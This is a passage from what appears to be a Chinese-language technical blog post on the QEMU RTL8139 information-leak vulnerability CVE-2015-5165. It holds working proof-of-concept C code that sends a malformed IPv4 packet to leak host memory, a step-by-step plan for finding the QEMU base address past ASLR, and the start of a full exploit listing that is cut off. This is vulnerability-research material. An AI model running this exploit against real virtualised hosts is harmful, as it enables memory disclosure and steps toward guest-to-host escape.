class="number">0x20</span>,</span><br><span class="line">    AcceptRunt      = <span class="number">0x10</span>,</span><br><span class="line">    AcceptBroadcast = <span class="number">0x08</span>,</span><br><span class="line">    AcceptMulticast = <span class="number">0x04</span>,</span><br><span class="line">    AcceptMyPhys    = <span class="number">0x02</span>,</span><br><span class="line">    AcceptAllPhys   = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_CplusCmdBits </span><br><span class="line">&#123;</span><br><span class="line">    CPlusRxVLAN   = <span class="number">0x0040</span>, <span class="comment">/* enable receive VLAN detagging */</span></span><br><span class="line">    CPlusRxChkSum = <span class="number">0x0020</span>, <span class="comment">/* enable receive checksum offloading */</span></span><br><span class="line">    CPlusRxEnb    = <span class="number">0x0002</span>,</span><br><span class="line">    CPlusTxEnb    = <span class="number">0x0001</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RT8139_ChipCmdBits </span><br><span class="line">&#123;</span><br><span class="line">    CmdReset    = <span class="number">0x10</span>,</span><br><span class="line">    CmdRxEnb    = <span class="number">0x08</span>,</span><br><span class="line">    CmdTxEnb    = <span class="number">0x04</span>,</span><br><span class="line">    RxBufEmpty  = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL8139_TxPollBits </span><br><span class="line">&#123;</span><br><span class="line">    CPlus = <span class="number">0x40</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx / Tx descriptor</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> dw0;</span><br><span class="line">    <span class="keyword">uint32_t</span> dw1;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_lo;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_hi;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx / Tx ring</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_ring</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span>* <span class="title">desc</span>;</span></span><br><span class="line">    <span class="keyword">void</span>* buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> rtl8139_packet[] = </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Ethernet Frame Header 数据</span></span><br><span class="line">    <span class="comment">// DST MAC 52:54:00:12:34:57</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>, </span><br><span class="line">    <span class="comment">// SRC MAC 52:54:00:12:34:57</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>, </span><br><span class="line">    <span class="comment">// Length / Type: IPv4</span></span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x00</span>, </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Ethernet Frame Payload 数据, 即 IPv4 数据包</span></span><br><span class="line">    <span class="comment">// Version &amp; IHL(Internet Header Length)</span></span><br><span class="line">    (<span class="number">0x04</span> &lt;&lt; <span class="number">4</span>) | <span class="number">0x05</span>,    <span class="comment">// 0x05 * 4 = 20 bytes</span></span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// Total Length = 0x13 = 19 bytes</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x13</span>,     <span class="comment">// 19 - 20 = -1 = 0xFFFF, trigger vulnerability</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Identification</span></span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x00</span>,     <span class="comment">// Flags &amp; Fragment Offset</span></span><br><span class="line">    <span class="number">0x40</span>,           <span class="comment">// TTL</span></span><br><span class="line">    <span class="number">0x06</span>,           <span class="comment">// Protocol: TCP</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Header checksum</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="comment">// Source IP: 127.0.0.1</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="comment">// Destination IP: 127.0.0.1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// IP Packet Payload 数据, 即 TCP 数据包</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Source Port</span></span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0xef</span>,     <span class="comment">// Destination Port</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="comment">// Sequence Number</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="comment">// Acknowledgement Number</span></span><br><span class="line">    <span class="number">0x50</span>,           <span class="comment">// 01010000, Header Length = 5 * 4 = 20</span></span><br><span class="line">    <span class="number">0x10</span>,           <span class="comment">// 00010000, ACK</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Window Size</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// TCP checksum</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>      <span class="comment">// Urgent Pointer</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> get_physical_pfn(<span class="keyword">void</span>* addr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = <span class="number">-1</span>;</span><br><span class="line">    FILE* fp = fopen(<span class="string">"/proc/self/pagemap"</span>, <span class="string">"rb"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> pfn;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!fseek(fp, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr / PAGE_SIZE * <span class="number">8</span>, SEEK_SET)) </span><br><span class="line">    &#123;</span><br><span class="line">        fread(&amp;pfn, <span class="keyword">sizeof</span>(pfn), <span class="number">1</span>, fp);</span><br><span class="line">        <span class="keyword">if</span> (pfn &amp; PFN_PRESENT) </span><br><span class="line">        &#123;</span><br><span class="line">            pfn &amp;= PFN_PFN;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> pfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> gva_to_gpa(<span class="keyword">void</span>* addr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = get_physical_pfn(addr);</span><br><span class="line">    <span class="keyword">return</span> pfn * PAGE_SIZE + (<span class="keyword">uint64_t</span>)addr % PAGE_SIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_rx</span><span class="params">(rtl8139_ring* ring, rtl8139_desc* desc, <span class="keyword">size_t</span> nb)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> buffer_size = RTL8139_BUFFER_SIZE + <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; nb; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;desc[i], <span class="number">0</span>, <span class="keyword">sizeof</span>(desc[i]));</span><br><span class="line">        ring[i].desc = &amp;desc[i];</span><br><span class="line">        </span><br><span class="line">        ring[i].buffer = aligned_alloc(PAGE_SIZE, buffer_size);</span><br><span class="line">        <span class="built_in">memset</span>(ring[i].buffer, <span class="number">0</span>, buffer_size);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// descriptor owned by NIC 准备接收数据</span></span><br><span class="line">        ring[i].desc-&gt;dw0 |= CP_RX_OWN;</span><br><span class="line">        <span class="keyword">if</span> (i == nb - <span class="number">1</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            ring[i].desc-&gt;dw0 |= CP_RX_EOR; <span class="comment">// End of Ring</span></span><br><span class="line">        &#125;</span><br><span class="line">        ring[i].desc-&gt;dw0 &amp;= ~CP_RX_BUFFER_SIZE_MASK;</span><br><span class="line">        ring[i].desc-&gt;dw0 |= buffer_size;   <span class="comment">// buffer_size</span></span><br><span class="line">        ring[i].desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(ring[i].buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Rx descriptors address</span></span><br><span class="line">    outl((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), RTL8139_PORT + RxRingAddrLO);</span><br><span class="line">    outl(<span class="number">0</span>, RTL8139_PORT + RxRingAddrHI);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_tx</span><span class="params">(rtl8139_desc* desc, <span class="keyword">void</span>* buffer)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(desc, <span class="number">0</span>, <span class="keyword">sizeof</span>(rtl8139_desc));</span><br><span class="line">    desc-&gt;dw0 |= CP_TX_OWN |    <span class="comment">// descriptor owned by NIC 准备发送数据</span></span><br><span class="line">                 CP_TX_EOR |</span><br><span class="line">                 CP_TX_LS |</span><br><span class="line">                 CP_TX_LGSEN |</span><br><span class="line">                 CP_TX_IPCS |</span><br><span class="line">                 CP_TX_TCPCS;</span><br><span class="line">    desc-&gt;dw0 += RTL8139_BUFFER_SIZE;</span><br><span class="line">    desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(buffer);</span><br><span class="line">    outl((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), RTL8139_PORT + TxAddr0);</span><br><span class="line">    outl(<span class="number">0</span>, RTL8139_PORT + TxAddr0 + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_card_config</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 触发漏洞需要设置的一些参数</span></span><br><span class="line">    outl(TxLoopBack, RTL8139_PORT + TxConfig);</span><br><span class="line">    outl(AcceptMyPhys, RTL8139_PORT + RxConfig);</span><br><span class="line">    outw(CPlusRxEnb | CPlusTxEnb, RTL8139_PORT + CpCmd);</span><br><span class="line">    outb(CmdRxEnb | CmdTxEnb, RTL8139_PORT + ChipCmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_packet_send</span><span class="params">(<span class="keyword">void</span>* buffer, <span class="keyword">void</span>* packet, <span class="keyword">size_t</span> len)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= RTL8139_BUFFER_SIZE) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(buffer, packet, len);</span><br><span class="line">        outb(CPlus, RTL8139_PORT + TxPoll);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxd</span><span class="params">(<span class="keyword">uint8_t</span>* ptr, <span class="keyword">size_t</span> size)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; size; ++i, ++j) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">16</span> == <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n0x%08x: "</span>, ptr + i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%02x "</span>, ptr[i]);</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">7</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"- "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 44 * RTL8139_BUFFER_SIZE = 44 * 1514 = 66616</span></span><br><span class="line">    <span class="comment">// 可以收完 65535 字节数据</span></span><br><span class="line">    <span class="keyword">size_t</span> rtl8139_rx_nb = <span class="number">44</span>;</span><br><span class="line">    rtl8139_ring* rtl8139_rx_ring = (rtl8139_ring*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb * <span class="keyword">sizeof</span>(struct rtl8139_ring));</span><br><span class="line">    rtl8139_desc* rtl8139_rx_desc = (rtl8139_desc*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb * <span class="keyword">sizeof</span>(struct rtl8139_desc));</span><br><span class="line">    rtl8139_desc* rtl8139_tx_desc = (rtl8139_desc*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, <span class="keyword">sizeof</span>(struct rtl8139_desc));</span><br><span class="line">    <span class="keyword">void</span>* rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// change I/O privilege level</span></span><br><span class="line">    iopl(<span class="number">3</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// initialize Rx ring, Rx descriptor, Tx descriptor</span></span><br><span class="line">    rtl8139_desc_config_rx(rtl8139_rx_ring, rtl8139_rx_desc, rtl8139_rx_nb);</span><br><span class="line">    rtl8139_desc_config_tx(rtl8139_tx_desc, rtl8139_tx_buffer);</span><br><span class="line">    rtl8139_card_config();</span><br><span class="line">    rtl8139_packet_send(rtl8139_tx_buffer, rtl8139_packet, </span><br><span class="line">                        <span class="keyword">sizeof</span>(rtl8139_packet));</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// print leaked data</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; rtl8139_rx_nb; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// RTL8139_BUFFER_SIZE 之后 4 字节数据为 Checksum</span></span><br><span class="line">        <span class="comment">// 不打印也无所谓了</span></span><br><span class="line">        xxd((<span class="keyword">uint8_t</span>*)rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> free heap blocks</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行 PoC 后，在接收到的中间某些数据包中可以看到泄露的数据：</p>
<p><img src="/uploads/202006/cve-2015-5165-poc.png" alt="QEMU 漏洞 CVE-2015-5165 PoC"></p>
<h3 id="4-5-漏洞利用"><a href="#4-5-漏洞利用" class="headerlink" title="4.5 漏洞利用"></a>4.5 漏洞利用</h3><p>Phrack 文章 [1] 漏洞利用的思路为：在泄露的数据中搜索保存了 <code>ObjectProperty</code> 对象的堆块（可能是已经被释放的堆块），通过读取 <code>ObjectProperty</code> 对象中保存的函数指针来泄露模块 <code>qemu-system-x86_64</code> 的基地址。</p>
<p>结构体 <code>ObjectProperty</code> 的定义如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Q_TAILQ_ENTRY(type, qual)                               \</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span>                                                        \</span><br><span class="line">    qual type *tqe_next;        <span class="comment">/* next element */</span>              \</span><br><span class="line">    qual type *qual *tqe_prev;  <span class="comment">/* address of previous next element */</span>\</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTAILQ_ENTRY(type)       Q_TAILQ_ENTRY(struct type,)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ObjectProperty</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    gchar *name;</span><br><span class="line">    gchar *type;</span><br><span class="line">    gchar *description;</span><br><span class="line">    ObjectPropertyAccessor *get;</span><br><span class="line">    ObjectPropertyAccessor *<span class="built_in">set</span>;</span><br><span class="line">    ObjectPropertyResolve *resolve;</span><br><span class="line">    ObjectPropertyRelease *release;</span><br><span class="line">    <span class="keyword">void</span> *opaque;</span><br><span class="line"></span><br><span class="line">    QTAILQ_ENTRY(ObjectProperty) node;</span><br><span class="line">&#125; ObjectProperty;</span><br></pre></td></tr></table></figure>
<p>这里 <code>get / set / resolve / release</code> 保存的值均为函数指针。</p>
<p><strong>利用步骤：</strong></p>
<ol>
<li>结构体 <code>ObjectProperty</code> 的大小为 <code>0x50</code> 字节，因此包含 metadata 的堆块的大小为 <code>0x60</code> 字节，可以根据这一信息去搜索泄露的数据中存在的堆块；</li>
<li>ASLR 不会对地址的低 <code>12</code> 位进行随机化处理，因此可以以相关函数地址的低 <code>12</code> 位为特征进行搜索，以计算出模块 <code>qemu-system-x86_64</code> 的基地址;</li>
<li>统计泄露的数据中出现的 <code>uint64_t</code> 类型的数据 <code>0x00007FXXYYZZZZZZ</code> ，其中 <code>7FXXYY</code> 出现次数最多的数据，就是 QEMU 虚拟机物理内存的结束地址；</li>
</ol>
<p>基于前面的 PoC 代码，笔者重写的一份用于测试 CVE-2015-5165 的完整 Exploit 代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 页面相关参数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Ethernet Frame 大小</span></span><br><span class="line"><span class="comment">// DST(6) + SRC(6) + Length/Type(2) + PayloadMTU(1500)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RTL8139_BUFFER_SIZE 1514</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 网卡 PMIO 地址</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RTL8139_PORT 0xc000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Rx ownership flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">// w0 end of ring flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">// Rx buffer size 